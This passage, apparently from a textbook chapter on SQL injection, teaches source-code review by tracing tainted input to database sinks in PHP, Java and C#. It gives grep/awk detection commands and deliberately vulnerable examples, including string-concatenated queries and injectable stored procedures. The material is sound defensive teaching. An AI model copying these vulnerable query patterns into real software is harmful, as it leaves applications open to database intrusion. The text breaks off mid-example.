line by \nline to identify potential vulnerabilities.  However, with large applications that have many lines \nof code,  it is often not feasible to scrutinize each line. The task can be very time -consuming \nand laborious. To counter this, security consultants and developers often write tools and \nscripts, or use various developer and operating system tools, to help with the task of reviewing large code bases.  \nIt is very important to adopt a methodical approach when reviewing the source code. The \ngoal of the code review is to locate and analyze areas of the code that may have application security implications. The approach pre sented in this chapter is targeted at the detection of \ntaint- style vulnerabilities. Tainted data are data that have been received from an untrusted \nsource (internal variables can also become tainted if tainted data are copied to them). You can untaint tain ted data through the use of proven sanitization routines or input validation \nfunctions. Tainted data can potentially cause security problems at vulnerable points in the program; these vulnerable points are referred to as sinks . \nIn the context of reviewing code for SQL injection vulnerabilities, we will refer to a sink as \na security -sensitive function that is used to execute SQL statements against a database. To \nnarrow the focus of the review, we should begin by identifying potential sinks. This is not an easy task, as each programming language offers a number of different ways to construct and execute SQL statements (these are listed in detail in “Dangerous Functions” later in this \nchapter). Once you have identified a sink, it may be very obvious that SQL injection vulnerability exists. However, in most cases you will have to dig a little deeper into the code base to determine whether one exists. SQL injection vulnerabilities most commonly occur when the Web application developer does not ensure that values r eceived from a sink source  (a \nmethod from where the tainted data originates, such as a Web form, cookie, input parameter, etc.) are validated before passing them to SQL queries that will be executed on a database server. The following line of PHP code illustrates this:  \n$result = mysql_query(“SELECT ∗ FROM table WHERE column = ‘$_GET[“param”]’”); \nThe preceding code is vulnerable to SQL injection because user input is passed directly to a \ndynamically constructed SQL statement and is executed without first being validated.  \nIn most cases, identifying a function that is used to create and execute SQL statements will \nnot be the end of the process, as it may not be possible from the line of code to easily identify the presence of a vulnerability. For example, the l ine of the PHP code that follows is \npotentially vulnerable, but you can’t be sure, as you do not know whether the $param  variable is \ntainted or whether it is validated before it is passed to the function:  \n$result = mysql_query(“SELECT ∗ FROM table WHERE column = ‘$param’”);  \nTo make an informed decision as to whether a vulnerability exists, you need to trace the \nvariable to its origin and follow its flow through the application. To do this you need to \nidentify the entry points into the application (the sink source), and search  the source code to \nidentify at what point the $param  variable is assigned a value. You are trying to identify a line \nof the PHP code that is similar to the one that follows: \n$param = $_GET[“param”];  \nThe preceding line assigns the user -controlled data to the $param  variable.  \nOnce an entry point is identified, it is important to trace the input to discover where and how \nthe data are used. You can do this by tracing the execution flow. If the trace found the following two lines of PHP code, you could safely deduce that the application was vulnerable \nto SQL injection within the user -controlled parameter \n$param : \n$param = $_GET[“param”];  \n$result = mysql_query(“SELECT ∗ FROM table WHERE field = ‘ $param’” ); \nThe preceding code is vulnerable to SQL  injection because a tainted variable ( $param ) is \npassed directly to a dynamically constructed SQL statement ( sink) and is executed. If the trace \nfound the following three lines of PHP code, you could also safely deduce that the application was vulnerable to SQL injection; however, a limit is imposed on the length of the input. This \nmeans it may or may not be possible to effectively exploit the issue. You need to start tracing \nthe \n$limit  variable to see exactly how much space is available for an injection:  \n$param = $_GET[“param”];  \nif (strlen($param) < $limit){error_handler(“param exceeds max length!”)}  \n$result = mysql_query(“SELECT ∗ FROM table WHERE field = ‘ $param’” ); \nIf the trace found the following two lines of PHP code, you could deduce that the developer \nmade an attempt at preventing SQL injection: \n$param = mysql_real_escape_string($param);  \n$result = mysql_query(“SELECT ∗ FROM table WHERE field = ‘ $param’” ); \nThe magic_quotes() , addslashes() , and mysql_real_escape_string()  filters cannot completely \nprevent the presence or exploitation of an SQL injection vulnerability. Certain techniques used \nin conjunction with environmental conditions will allow an attacker to exploit the vulnerability. Because of this, you can deduce that  the application may be vulnerable to SQL \ninjection within the user -controlled parameter \n$param . \nAs you can see from the previous contrived and simplified examples, the process of \nreviewing the source code for SQL injection vulnerabilities requires a lot of work. It is important to map all dependencies and trace all data flows so that you can identify tainted and untainted inputs as well as use a degree of acumen to prove or disprove the feasibility of a vulnerability being exploitable. By following a metho dical approach, you can ensure that the \nreview reliably identifies and proves the presence (or absence) of all potential SQL injection vulnerabilities.  \nYou should start any review by identifying functions that are used to build and execute SQL \nstatements (\nsinks ) with user -controlled input that is potentially tainted; then you should \nidentify entry points for user -controlled data that are being passed to these functions ( sink \nsources ) and, finally, trace the user -controlled data through the application’s exe cution flow to \nascertain whether the data are tainted when it reaches the sink. You can then make an informed \ndecision as to whether a vulnerability exists and how feasible it would be to exploit it.  \nTo simplify the task of performing a manual code review,  you can build complex scripts or \nprograms in any language to grab various patterns in the source code and link them together. \nThe following sections of this chapter will show you examples of what to look for in PHP, C#, \nand Java code. You can apply the pr inciples and techniques to other languages as well, and \nthey will prove to be very useful in identifying other coding flaws.  \nDangerous Coding Behaviors  \nTo perform an effective source code review and identify all potential SQL injection \nvulnerabilities, you need to be able to recognize dangerous coding behaviors, such as code that incorporates dynamic string -building techniques. Chapter 1  introduced some of these \ntechniques, in the section “Understanding How It Happens”; here you will build upon the \nlessons you learned so that you can identify the dangerous coding behaviors in a given \nlanguage.  \nTo get started, the follo wing lines build strings that are concatenated with tainted input (data \nthat have not been validated):  \n// a dynamically built sql string statement in PHP  \n$sql = “SELECT ∗  FROM table WHERE field = ‘$_GET[“input”]’”; \n// a dynamically built sql string statement in C#  \nString sql = “SELECT ∗  FROM table WHERE field = ’” +request.getParameter(“ input”) + “’”; \n// a dynamically built sql string statement in Java  \nString sql = “SELECT ∗  FROM table WHERE field = ’” +request.getParameter(“ input”) + “’”; \nThe PHP, C#, and Java source code presented next shows how some developers \ndynamically build and execute SQL statements that contain user -controlled data that have not \nbeen validated. It is important that you are able to identify this coding behavior when reviewing the sou rce code for vulnerabilities:  \n// a dynamically executed sql statement in PHP  \nmysql_query(“SELECT ∗ FROM table WHERE field = ‘$_GET[“input”]’”); \n// a dynamically executed sql string statement in C#  \nSqlCommand command = new SqlCommand(“SELECT ∗  FROM table WHERE field = ’” \n+request.getParameter(“input”) + “’”, connection);  \n// a dynamically executed sql string statement in Java  \nResultSet rs = s.executeQuery(“SELECT ∗ FROM table WHERE field = ’” \n+request.getParameter(“ input”) + “’”);  \nSome developers believe that  if they do not build and execute dynamic SQL statements and \ninstead only pass data to stored procedures such as parameters, their code will not be vulnerable. However, this is not true, as stored procedures can be vulnerable to SQL injection \nalso. A store d procedure is a set of SQL statements with an assigned name that’s stored in a \ndatabase. Here is an example of a vulnerable Microsoft SQL Server stored procedure:  \n// vulnerable stored procedure in MS SQL  \nCREATE PROCEDURE SP_StoredProcedure @input varchar(400) = NULL AS  \nDECLARE @sql nvarchar(4000)  \nSELECT @sql = ‘SELECT field FROM table WHERE field = ’’’ + @input + ’’’’  \nEXEC (@sql)  \nIn the preceding example, the @input  variable is taken directly from the user input and \nconcatenated with the SQL string (i.e. @sql). The SQL string is passed to the EXEC function as a \nparameter and is executed. The preceding Microsoft SQL Server stored procedure is \nvulnerable to SQL injection even though the user input is being passed to it as a parameter.  \nThe Microsoft SQL Server  database is not the only database where stored procedures can be \nvulnerable to SQL injection. Here is the source code for a vulnerable MySQL stored procedure:  \n// vulnerable stored procedure in MySQL  \nCREATE PROCEDURE SP_ StoredProcedure (input varchar(400))  \nBEGIN  \nSET @param = input;  \nSET @sql = concat(‘SELECT field FROM table WHERE field=’,@param);  \nPREPARE stmt FROM @sql;  \nEXECUTE stmt;  \nDEALLOCATE PREPARE stmt;  \nEnd \nIn the preceding example, the input  variable is taken directly from the user input and \nconcatenated with the SQL string ( @sql). The SQL string is passed to the EXECUTE  function as a \nparameter and is executed. The preceding MySQL stored procedure is vulnerable to SQL \ninjection even though the  user input is passed to it as a parameter.  \nJust as with Microsoft SQL Server and MySQL databases, Oracle database stored \nprocedures can also be vulnerable to SQL injection. Here is the source code for a vulnerable Oracle stored procedure:  \n-- vulnerable stored procedure in Oracle  \nCREATE OR REPLACE PROCEDURE SP_ StoredProcedure (input IN VARCHAR2) AS  \nsql VARCHAR2;  \nBEGIN  \nsql:= ‘SELECT field FROM table WHERE field = ’’’ || input || ‘‘’’;  \nEXECUTE IMMEDIATE sql;  \nEND; \nIn the preceding case, the input  variable is taken directly from the user input and \nconcatenated with the SQL string ( sql). The SQL string is passed to the EXECUTE  function as a \nparameter and is executed. The preceding Oracle stored procedure is vulnerable to SQL injection even though the  user input is passed to it as a parameter.  \nDevelopers use slightly different methods for interacting with stored procedures. The \nfollowing lines of code are presented as examples of how some developers execute stored procedures from within their code:  \n// a dynamically executed sql stored procedure in PHP  \n$result = mysql_query(“select SP_StoredProcedure($_GET[‘input’])”);  \n// a dynamically executed sql stored procedure in C#  \nSqlCommand cmd = new SqlCommand(“SP_StoredProcedure”, conn);  \ncmd.CommandType = Comma ndType.StoredProcedure;  \ncmd.Parameters.Add(new SqlParameter(“@input”,request.getParameter(“input”)));  \nSqlDataReader rdr = cmd.ExecuteReader();  \n// a dynamically executed sql stored procedure in Java  \nCallableStatement cs = con.prepareCall(“{call SP \nStoredProcedurerequest.getParameter(“input”)}”);  \nstring output = cs.executeUpdate();  \nThe preceding lines of code all execute and pass user -controlled tainted data as parameters \nto SQL stored procedures. If the stored procedures are incorrectly constructed in a similar \nfashion to the examples presented previously, an exploitable SQL injection vulnerability may \nexist. When reviewing the source code, not only is it important to identify vulnerabilities in the application source code, but in cases where stored procedures are in use, you may have to review the SQL code of stored procedures as well . The example source code given in this \nsection should be sufficient to help you understand how developers produce code that is vulnerable to SQL injection. However, the examples given are not extensive; each programming  language offers a number of differe nt ways to construct and execute SQL \nstatements, and you need to be familiar with all of them (I list them in detail for C#, PHP, and Java in “Dangerous Functions” later in this chapter).  \nTo make a definitive claim that a vulnerability exists in the code b ase, it is necessary to \nidentify the application’s entry points (\nsink sources ) to ensure that the user -controlled input \ncan be used to smuggle in SQL statements. To achieve this, you need to be familiar with how user-controllable input gets into the applic ation. Again, each programming language offers a \nnumber of different ways to obtain user input. The most common method of taking in user input is by using an HTML form. The following HTML code illustrates how a Web form is \ncreated:  \n<form name=“simple_form”  method=“get” action=“process_input.php”>  \n<input type=“text” name=“foo”>  \n<input type=“text” name=“bar”>  \n<input type=“submit” value=“submit”>  \n</form>  \nIn HTML, you can specify two different submission methods for a form: You can use either \nthe get or the pos t method. You specify the method inside a FORM element, using the \nMETHOD attribute. The difference between the get method and the post method is primarily \ndefined in terms of form data encoding. The preceding form uses the get method; this means the Web br owser will encode the form data within the URL. If the form used the post method, \nit would mean the form data would appear within a message body. If you were to submit the preceding form via the post method, you would see “http://www.victim.com/process_input.php” in the address bar. If you were to submit the \ninformation via the get method, you would see the address bar change to “http://www.victim.com/process_input.php?foo=input&bar=input ”. \nEverything after the question mark (?) is known as the query string. The query string holds \nthe user input submitted via the form (or submitted manually in the URL). Parameters are separated by an ampersand (&) or a semicolon (;) and parameter names and values are \nseparated by an equals sign (=). The get method has a size limit imposed upon it because the data are encoded within the URL and the maximum length of a URL is 2048 characters. The post method has no size limitations. The ACTION attribute specifies the URL of the script, \nwhich processes the form. \nWeb applications also make use of Web cookies. A cookie is a general mechanism that \nserver -side connections can use to both store and retrie ve information on the client side of a \nconnection. Cookies allow Web developers to save information on the client machine and retrieve the data for processing at a later stage. Application developers may also use HTTP headers. HTTP headers form the core of  an HTTP request, and are very important in an HTTP \nresponse. They define various characteristics of the data that are requested or the data that have been provided.  \nWhen PHP is used on a Web server to handle an HTTP request, it converts information \nsubmit ted in the HTTP request as predefined variables. The following functions are available \nto PHP developers for processing this user input:  \n• $_GET:  An associative array of variables passed via the HTTP GET method  \n• $HTTP_GET_VARS:  Same as $_GET, deprecated i n PHP Version 4.1.0 \n• $_POST:  An associative array of variables passed via the HTTP POST method \n• $HTTP_POST_VARS:  Same as $_POST, deprecated in PHP Version 4.1.0 \n• $_REQUEST:  An associative array that contains the contents of $_GET, $_POST, and \n$_COOKIE  \n• $_COOKIE:  An associative array of variables passed to the current script via HTTP cookies  \n• $HTTP_COOKIE_VARS:  Same as $_COOKIE, deprecated in PHP Version 4.1.0 \n• $_SERVER:  Server and execution environment information \n• $HTTP_SERVER_VARS:  Same as $_SERVER , deprecated in PHP Version 4.1.0 \nThe following lines of code demonstrate how you can use these functions in a PHP \napplication:  \n// $_GET -  an associative array of variables passed via the GET method  \n$variable = $_GET[‘name’];  \n// $HTTP_GET_VARS - an associa tive array of variables passed via the HTTP  \n// GET method, depreciated in PHP v4.1.0  \n$variable = $GET_GET_VARS[‘name’];  \n// $_POST - an associative array of variables passed via the POST method  \n$variable = $_POST[‘name’];  \n// $HTTP_POST_VARS -  an associative array of variables passed via the POST // method, \ndepreciated in PHP v4.1.0  \n$variable = $HTTP_POST_VARS[‘name’];  \n// $_REQUEST -  an associative array that contains the contents of $_GET,  \n// $_POST & $_COOKIE  \n$variable = $_REQUEST[‘name’];  \n// $_COOKIE -  an associative array of variables passed via HTTP Cookies  \n$variable = $_COOKIE[‘name’];  \n// $_SERVER -  server and execution environment information  \n$variable = $_SERVER[‘name’];  \n// $HTTP_SERVER_VARS -  server and execution env ironment information,  \n// depreciated in PHP v4.1.0.  \n$variable = $HTTP_SERVER_VARS[‘name’]  \nPHP has a very well -known setting, register_globals , which you can configure from within \nPHP’s configuration file ( php.ini ) to register the EGPCS  (Environment, GET, P OST, Cookie, \nServer) variables as global variables. For example, if register_globals  is on, the URL \n“http://www.victim.com/process_input.php?foo=input ” will declare $foo as a global variable  \nwith no code required (there are serious security issues with this setting, and as such it has \nbeen deprecated and should always be turned off). If register_globals  is enabled, user input \ncan be retrieved via the INPUT element and is referenced via the name attribute within an HTML form. For example:  \n$variable = $foo;  \nIn Java, the process is fairly similar. You use the request object to get the value that the \nclient passes to the Web server during an HTTP request. The request object takes the value from th e client’s Web browser and passes it to the server via an HTTP request. The class or the \ninterface name of the object request is \nHttpServletRequest . You write the object request as \njavax.servlet.http.HttpServletRequest . Numerous methods are available for t he request object. \nWe are interested in the following functions, which are used for processing user input:  \n• getParameter( ):  Used to return the value of a requested given parameter  \n• getParameterValues( ):  Used to return all the values of a given parameter’s request as an \narray  \n• getQueryString( ):  Used to return the query string from the request  \n• getHeader( ):  Used to return the value of the requested header  \n• getHeaders( ):  Used to return the values of the requested header as an enumeration of string \nobjects  \n• getRequestedSessionId( ):  Returns the session ID specified by the client  \n• getCookies( ):  Returns an array of cookie objects  \n• cookie.getValue( ):  Used to return the value of a requested given cookie value  \nThe following lines of code demonstrate how you can use these functions in a Java \napplication:  \n// getParameter() - used to return the value of a requested given parameter  \nString string_variable = request.getParameter(“name”);  \n// getParameterValues() - used to return all the values of a given  \n// parameter’s request as an array  \nString[] string_array = request.getParameterValues(“name”);  \n// getQueryString() -  used to return the query string from the request  \nString string_variable = request.getQueryString();  \n// getHeader() -  used to return the value of the requested header  \nString string_variable = request.getHeader(“User -Agent”);  \n// getHeaders() –  used to return the values of the requested header as an  \n// Enumeration of String objects  \nEnumeration enumeration_object = request.getHeaders(“User- Agent”);  \n// getRequestedSessionId() -  returns the session ID specified by the client  \nString string_variable = request.getRequestedSessionId();  \n// getCookies() -  returns an array of Cookie objects  \nCookie[] Cookie_array = request.getCookies();  \n// cookie.getValue() -  used to return the value of a requested given cookie  \n// value  \nString string_variable = Cookie_array.getValue(“name”);  \nIn C# applications, developers use the HttpRequest  class, which is part  of the System.Web  \nnamespace. It contains properties and methods necessary to handle an HTTP request, as well \nas all information passed by the browser, including all form variables, certificates, and header information. It also contains the CGI server vari ables. Here are the properties of the class:  \n• HttpCookieCollection:  A collection of all the cookies passed by the client in the current \nrequest  \n• Form:  A collection of all form values passed from the client during the submission of a form  \n• Headers:  A col lection of all the headers passed by the client in the request  \n• Params:  A combined collection of all query string, form, cookie, and server variables  \n• QueryString:  A collection of all query string items in the current request  \n• ServerVariables:  A collect ion of all the Web server variables for the current request  \n• URL:  Returns an object of type URI  \n• UserAgent:  Contains the user -agent header for the browser that is making the request  \n• UserHostAddress:  Contains the remote Internet Protocol (IP) address of  the client  \n• UserHostName:  Contains the remote host name of the client  \nThe following lines of code demonstrate how you can use these functions in a C# \napplication:  \n// HttpCookieCollection - a collection of all the cookies  \nHttpCookieCollection variable = Request.Cookies;  \n// Form -  a collection of all form values  \nstring variable = Request.Form[“name”];  \n// Headers -  a collection of all the headers  \nstring variable = Request.Headers[“name”];  \n// Params - a combined collection of all querystring, form, cookie, and  \n// server variables  \nstring variable = Request.Params[“name”];  \n// QueryString -  a collection of all querystring items  \nstring variable = Request.QueryString[“name”];  \n// ServerVariables -  a collection of all the web server variables  \nstring variable = Request.ServerVariables[“name”];  \n// Url -  returns an object of type Uri, the query property contains  \n// information included in the specified URI i.e ?foo=bar.  \nUri object_variable = Request.Url;  \nstring variable = object_variable. Query;  \n// UserAgent -  contains the user- agent header for the browser  \nstring variable = Request.UserAgent;  \n// UserHostAddress -  contains the remote IP address of the client  \nstring variable = Request.UserHostAddress;  \n// UserHostName -  contains the remote host name of the client  \nstring variable = Request.UserHostName;  \nDangerous Functions  \nIn the previous section, we looked at how user -controlled input gets into an application, and \nlearned the v arying methods that are at our disposal to process these data. We also looked at a \nfew simple examples of the dangerous coding behaviors that can ultimately lead to vulnerable \napplications. The example source code I provided in the previous section should be sufficient to help you understand how developers produce code that is vulnerable to SQL injection. However, the examples were not extensive; each programming language offers a number of different ways to construct and execute SQL statements, and you nee d to be familiar with all of \nthem. This section of the chapter presents a detailed list of these methods, along with examples of how they are used. We will start with the PHP scripting language.  \nPHP supports numerous database vendors; visit \nhttp://www.php.net/manual/en/refs.database.vendors.php for a comprehensive list. We will \nconcentrate on just a few common database vendors for the purpose of clarity. The following list details the re levant functions for MySQL, Microsoft SQL Server, Postgres, and Oracle \ndatabases:  \n• mssql_query( ):  Sends a query to the currently active database  \n• mysql_query( ):  Sends a query to the currently active database  \n• mysql_db_query( ):  Selects a database, and  executes a query on it (depreciated in PHP \nVersion 4.0.6)  \n• oci_parse( ):  Parses a statement before it is executed (prior to oci_execute( )/ociexecute( ))  \n• ora_parse( ):  Parses a statement before it is executed (prior to ora_exec( ))  \n• mssql_bind( ):  Add s a parameter to a stored procedure (prior to mssql_execute( ))  \n• mssql_execute( ):  Executes a stored procedure  \n• odbc_prepare( ):  Prepares a statement for execution (prior to odbc_execute( ))  \n• odbc_execute( ):  Executes an SQL statement  \n• odbc_exec( ):  Prepares and executes an SQL statement  \n• pg_query( ):  Execute a query (used to be called pg_exec)  \n• pg_exec( ):  Is still available for compatibility reasons, but users are encouraged to use the \nnewer name  \n• pg_send_query( ):  Sends an asynchronous query \n• pg_send_query_params( ):  Submits a command and separate parameters to the server \nwithout waiting for the result(s)  \n• pg_query_params( ):  Submits a command to the server and waits for the result  \n• pg_send_prepare( ):  Sends a request to create a prepared statem ent with the given \nparameters, without waiting for completion  \n• pg_prepare( ):  Submits a request to create a prepared statement with the given parameters, \nand waits for completion \n• pg_select( ):  Selects records specified by assoc_array  \n• pg_update( ):  Upd ates records that matches condition with data \n• pg_insert( ): Inserts the values of an assoc_array into a given table  \n• pg_delete( ):  Deletes records from a table specified by the keys and values in assoc_array  \nThe following lines of code demonstrate how y ou can use these functions in a PHP \napplication:  \n// mssql_query() -  sends a query to the currently active database  \n$result = mssql_query($sql);  \n// mysql_query() -  sends a query to the currently active database  \n$result = mysql_query($sql);  \n// mysql_db_query() -  selects a database, and executes a query on it  \n$result = mysql_db_query($db, $sql);  \n// oci_parse() -  parses a statement before it is executed  \n$stmt = oci_parse($connection, $sql);  \nociexecute($stmt);  \n// ora_parse() -  parses a statement before it is executed  \nif (!ora_parse($cursor, $sql)){exit;}  \nelse {ora_exec($cursor);}  \n// mssql_bind() -  adds a parameter to a stored procedure  \nmssql_bind($stmt, ‘@param’, $variable, SQLVARCHAR, false, false, 100);  \n$result = mssql_execute($stmt);  \n// odbc_prepare() - prepares a statement for execution  \n$stmt = odbc_prepare($db, $sql);  \n$result = odbc_execute($stmt);  \n// odbc_exec() -  prepare and execute a SQL statement  \n$result = odbc_exec($db, $sql);  \n// pg_query -  execute a query (used to be called pg_exec)  \n$result = pg_query($conn, $sql);  \n// pg_exec - is still available for compatibility reasons, but users are encouraged to use \nthe newer name.  \n$result = pg_exec($conn, $sql);  \n// pg_send_query -  sends asynchronous query  \npg_send_query($conn, $sql);  \n// pg_send_query_params - submits a command and separate parameters to the server without \nwaiting for the result(s).  \npg_send_query_params($conn, $sql, $params)  \n// pg_query_params -  submits a command to the server and waits for the result.  \npg_query_params($conn, $sql, $params)  \n// pg_send_prepare - sends a request to create a prepared statement with the given \nparameters, without waiting for completion.  \npg_send_prepare($conn, “my_query”, ‘SELECT ∗  FROM table WHERE field = $1 ’); \npg_send_execute($conn, “my_query”, $var);  \n// pg_prepare -  submits a request to create a prepared statement with the given parameters, \nand waits for completion.  \npg_prepare($conn, “my_query”, ‘SELECT ∗  FROM table WHERE field = $1’ ); \npg_execute($conn, “my_query”, $var);  \n// pg_select -  selects records  specified by assoc_array which has field=>value  \n$result = pg_select($conn, $table_name, $assoc_array)  \n// pg_update() -  updates records that matches condition with data  \npg_update($conn, $arr_update, $arr_where);  \n// pg_insert() -  inserts the values of assoc_array into the table specified by table_name.  \npg_insert($conn, $table_name, $assoc_array)  \n// pg_delete() - deletes records from a table specified by the keys and values in \nassoc_array  \npg_delete($conn, $table_name, $assoc_array)  \nThings are a little differe nt in Java. Java makes available the java.sql  package and the Java \nDatabase Connectivity (JDBC) API  for database connectivity; for details on supported vendors, \nsee http://java.sun.com/products/jdbc/driverdesc.html. We will concentrate on just a few \ncommon database vendors for the purpose of clarity. The following list details the relevant \nfunctions for MySQL, Microsoft SQL Server, PostgreSQL, and Oracle databases:  \n• createStatement( ): Creat es a statement object for sending SQL statements to the database  \n• prepareStatement( ): Creates a precompiled SQL statement and stores it in an object  \n• executeQuery( ):  Executes the given SQL statement  \n• executeUpdate( ):  Executes the given SQL statement  \n• execute( ):  Executes the given SQL statement  \n• addBatch( ): Adds the given SQL command to the current list of commands  \n• executeBatch( ):  Submits a batch of commands to the database for execution \nThe following lines of code demonstrate how you can use these functions in a Java \napplication:  \n// createStatement() -  is used to create a statement object that is used for  \n// sending sql statements to the specified database  \nstatement = connection.createStatement();  \n// PreparedStatement –  creates a precompiled SQL  statement and stores it  \n// in an object.  \nPreparedStatement sql = con.prepareStatement(sql);  \n// executeQuery() - sql query to retrieve values from the specified table.  \nresult = statement.executeQuery(sql);  \n// executeUpdate () -  Executes an SQL statement, which may be an  \n// INSERT, UPDATE, or DELETE statement or a statement that returns nothing  \nresult = statement.executeUpdate(sql);  \n// execute() -  sql query to retrieve values from the specified table.  \nresult = statement.execute(sql);  \n// addBatch() - adds the given SQL command to the current list of commands  \nstatement.addBatch(sql);  \nstatement.addBatch(more_sql);  \nAs you may expect, Microsoft and C# developers do things a little differently. See \nwww.connectionstrings.com  for a comprehensive collection of providers. Application \ndevelopers typically use the following namespaces:  \n• System.Data.SqlClient:  .NET Framework Data Provider for SQL Server  \n• System.Data.OleDb:  .NET Framework Data Provider for OLE DB  \n• System.Data.OracleClient:  .NET Framework Data Provider for Oracle  \n• System.Data.Odbc:  .NET Framework Data Provider for ODBC  \nThe following is a list of classes that are used within the namespaces: \n• SqlCommand( ):  Used to construct/send an SQL statement or stored procedure  \n• SqlParameter( ): Used to add parameters to an SqlCommand object  \n• OleDbCommand( ): Used to construct/send an SQL statement or stored procedure  \n• OleDbParameter( ):  Used to add parameters to an Ol eDbCommand object  \n• OracleCommand( ): Used to construct/send an SQL statement or stored procedure  \n• OracleParameter( ):  Used to add parameters to an OracleSqlCommand object  \n• OdbcCommand( ):  Used to construct/send an SQL statement or stored procedure  \n• Odb cParameter( ):  Used to add parameters to an OdbcCommand object  \nThe following lines of code demonstrate how you can use these classes in a C# application:  \n// SqlCommand() -  used to construct or send an SQL statement  \nSqlCommand command = new SqlCommand(sql, connection);  \n// SqlParameter() - used to add parameters to an SqlCommand object  \nSqlCommand command = new SqlCommand(sql, connection);  \ncommand.Parameters.Add(“@param”, SqlDbType.VarChar, 50).Value = input;  \n// OleDbCommand() - used to construct or send an SQL statement  \nOleDbCommand command = new OleDbCommand(sql, connection);  \n// OleDbParameter() -  used to add parameters to an OleDbCommand object  \nOleDbCommand command = new OleDbCommand($sql, connection);  \ncommand.Parameters.Add(“@param”, OleDbType.VarChar, 50).Value = input;  \n// OracleCommand() -  used to construct or send an SQL statement  \nOracleCommand command = new OracleCommand(sql, connection);  \n// OracleParameter() -  used to add parameters to an OracleCommand object  \nOracleCommand command = new OracleCommand(sql, connection);  \ncommand.Parameters.Add(“@param”, OleDbType.VarChar, 50).Value = input;  \n// OdbcCommand() -  used to construct or send an SQL statement  \nOdbcCommand command = new OdbcCommand(sql, connection);  \n// OdbcParameter() -  used to add parameters to an OdbcCommand object  \nOdbcCommand command = new OdbcCommand(sql, connection);  \ncommand.Parameters.Add(“@param”, OleDbType.VarChar, 50).Value = input;  \nFollowing the Data  \nNow that you have a good understanding of  how Web applications obtain input from the user, \nthe methods that developers use within their chosen language to process the data, and how bad \ncoding behaviors can lead to the presence of an SQL injection vulnerability, let’s put what you have learned to test by attempting to identify an SQL injection vulnerability and tracing the \nuser-controlled data through the application. Our methodical approach begins with identifying \nthe use of dangerous functions ( sinks ). \nYou can conduct a manual source code review by reviewing each line of code using a text \neditor or development IDE (integrated development environment). However, being thorough \ncan be a resource- intensive, time -consuming, and laborious process. To save time and quickly \nidentify code that should be ma nually inspected in more detail, the simplest and most \nstraightforward approach is to use the UNIX utility grep (also available for Windows systems). \nWe will need to compile a comprehensive list of tried and tested search strings to identify lines of code that could potentially be vulnerable to SQL injection, as each programming language offers a number of different ways to receive and process input as well as a myriad of methods to construct and execute SQL statements.  \nTools & traps… \nWhere’s Ya Tool?  \nThe grep tool is a command -line text search utility originally written for UNIX and found on most UNIX \nderivative operating systems by default, such as Linux and OS X. grep is also now available for Windows, and \nyou can obtain it from http://gnuwin32.sourceforge.net/packages/grep.htm . However, if you prefer to use native \nWindows utilities you can use the findstr  command, which can also search for patterns of text in files using \nregular expression s; for a syntax reference see http://technet.microsoft.com/en -us/library/bb490907.aspx . \nAnother tool that is very useful is awk, a general -purpose programming language that is designe d for processing \ntext-based data, either in files or in data streams; awk is also found on most UNIX derivative operating systems by \ndefault. The awk utility is also available to Windows users; you can obtain gawk (GNU awk) from \nhttp://gnuwin32.sourceforge.net/packages/gawk.htm . \nFollowing Data in PHP  \nWe will start with a PHP application. Before performing a source code review of the PHP code, it is always important to check the status of \nregister_globals  and magic_quotes . You \nconfigure these settings from within the PHP configuration file ( php.ini ). The register_globals  \nsetting registers the EGPCS  variables as global variables. This often leads to a variety of \nvulnerabilities, as the user can influence them. As of PHP 4.2.0, this functionality is disabled by default. However, some applications require it to function correctly. The \nmagic_quotes  \noption is deprecated as of  PHP Version 5.3.0 and will be removed from PHP in Version 6.0.0. \nmagic_quot es is a security feature implemented by PHP to escape potentially harmful characters \npassed to the application, including single quotes, double quotes, backslashes, and NULL \ncharacters.  \nHaving ascertained the status of these two options you can begin inspe cting the code. You \ncan use the following command to recursively search a directory of source files for the use of \nmssql_query() , mysql_db_query() , and mysql_query()  with direct user input into an SQL \nstatement. The command will print the filename and line number containing the match; awk is \nused to “prettify” the output:  \n$ grep - r -n “\\(mysql\\|mssql\\|mysql_db\\ )_query\\(.∗\\$\\(GET\\|\\POST\\) .∗\\)” src/ | awk - F: \n‘{print “filename: “$1” \\nline: “$2”\\ nmatch: “$3” \\n\\n”}’ \nfilename: src/mssql_query.vuln.php  \nline: 11  \nmatch: $result = mssql_query(“SELECT ∗  FROM TBL WHERE COLUMN = ‘ $_GET[‘var’]’”); \nfilename: src/mysql_query.vuln.php  \nline: 13  \nmatch: $result = mysql_query(“SELECT ∗  FROM TBL WHERE COLUMN = ‘$_GET[‘var’]’”, $link);  \nYou can also use the following command to recursively search a directory of source files for \nthe use of oci_parse()  and ora_parse()  with direct user input into an SQL statement. These \nfunctions are used prior to oci_exec() , ora_exec() , and oci_execute()  to compile an SQL \nstatement: \n$ grep -r -n “\\(oci\\|ora\\)_parse\\ (.∗\\$_\\(GET\\|\\POST\\).∗\\)” src/ | awk -F: ‘{print “filename: \n“$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ \nfilename: src/oci_parse.vuln.php  \nline: 4  \nmatch: $stid = oci_parse($conn, “SELECT ∗  FROM TABLE WHERE COLUMN = ‘ $_GET[‘var’]’”); \nfilename: src/ora_parse.vuln.php  \nline: 13  \nmatch: ora_parse($curs,“SELECT ∗  FROM TABLE WHERE COLUMN = ‘ $_GET[‘var’]’”); \nYou can use the following command to recursively search a directory of source files for the \nuse of odbc_prepare()  and odbc_exec()  with direct user input into an SQL statement. The \nodbc_prepare()  function is used prior to odbc_execute()  to compile an SQL st atement:  \n$ grep -r -n “\\(odbc_prepare\\ |odbc_exec\\ )\\(.∗\\$_\\(GET\\|\\POST\\).∗\\)” src/ | awk -F: ‘{print \n“filename: “$1”\\nline: “$2”\\nmatch: “$ \n3”\\n\\n”}’ \nfilename: src/odbc_exec.vuln.php  \nline: 3  \nmatch: $result = odbc_exec ($con, “SELECT ∗ FROM TABLE WHERE COLUM N = ‘$_GET[‘var’]’”);  \nfilename: src/odbc_prepare.vuln.php  \nline: 3  \nmatch: $result = odbc_prepare ($con, “SELECT ∗  FROM TABLE WHERE COLUMN = ‘ $_GET[‘var’]’”); \nYou can use the following command to recursively search a directory of source files for the \nuse of mssql_bind()  with direct user input into an SQL statement. This function is used prior to \nmssql_execute()  to compile an SQL statement:  \n$ grep - r -n “mssql_bind\\ (.∗\\$_\\(GET\\|\\POST\\).∗\\)” src/|awk -F: ‘{print “filename: \n“$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ \nfilename: src/mssql_bind.vuln.php  \nline: 8  \nmatch: mssql_bind($sp, “@paramOne”, $_GET[‘var_one’], SQLVARCHAR, false, false, 150);  \nfilename: src/mssql_bind.vuln.php  \nline: 9  \nmatch: 